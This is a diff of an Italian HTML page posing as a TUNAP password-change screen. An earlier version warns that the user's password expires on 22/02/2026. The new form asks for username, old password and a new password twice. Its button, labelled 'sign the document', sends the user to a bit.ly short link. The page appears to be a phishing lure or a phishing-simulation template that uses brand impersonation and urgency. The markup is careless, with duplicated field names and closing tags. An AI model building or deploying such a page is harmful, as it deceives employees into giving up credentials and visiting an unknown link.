@@ -1,10 +1,86 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Login TUNAP x cambio password</title>
+  <meta charset="UTF-8" />
+  <title>Cambio password TUNAP</title>
+  <style>
+    /* Stili per la finestra di avviso personalizzata */
+    #error-message {
+      display: none;
+      background-color: #f44336;
+      color: white;
+      padding: 20px;
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-radius: 5px;
+      z-index: 999;
+    }
+  </style>
+    
+  <script>
+    function validateForm() {
+      var username = document.getElementsByName('username')[0].value;
+      var password = document.getElementsByName('password')[0].value;
+
+      if (username === "" || password === "") {
+        // Mostra il messaggio di errore personalizzato
+        document.getElementById("error-message").style.display = "block";
+        setTimeout(function() {
+          document.getElementById("error-message").style.display = "none";
+        }, 3000); // Nasconde il messaggio dopo 3 secondi
+        return false;
+      } else {
+        window.location.href = 'https://bit.ly/45QP8LY';
+      }
+    }
+  </script>
 </head>
-<body>
-    <h1>Salve, </h1>
-    <p>la password della sua utenza TUNAP sta scadendo, prego cambiarla entro il 22/02/2026 </p>
+<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4;">
+  
+  <!-- Logo locale -->
+  <img src="logo_tunap.png" alt="TUNAP Logo" width="150" /><br /><br />
+
+  <!-- Titolo -->
+  <h2>Cambio Password</h2>
+  
+  <br /><br >
+  <!-- Finestra di errore personalizzata -->
+  <div id="error-message">Per favore, inserisci nome utente e password vecchia e due volte la nuova.</div>
+
+  
+  <br /><br >
+            
+  <!-- Form di login -->
+  <input
+    type="text"
+    name="username"
+    placeholder="Username"
+    required
+    style="padding: 8px; width: 250px;"
+  /><br /><br />
+  <input
+    type="password"
+    name="password"
+    placeholder="Password vecchia"
+    required
+    style="padding: 8px; width: 250px;"
+  /><br /><br />
+   <input
+    type="text"
+    name="username"
+    placeholder="Nuova password"
+    required
+    style="padding: 8px; width: 250px;"
+  /><br /><br />
+  <input
+  type="password"
+    name="password"
+    placeholder="Conferma Nuova Password"
+    required
+    style="padding: 8px; width: 250px;"
+  /><br /><br />
+  <!-- Pulsante che attiva la funzione di validazione -->
+  <button type="button" onclick="validateForm()" style="padding: 10px 20px;">Firma il Documento</button>
+</body>
+</html>
 </body>
 </html>
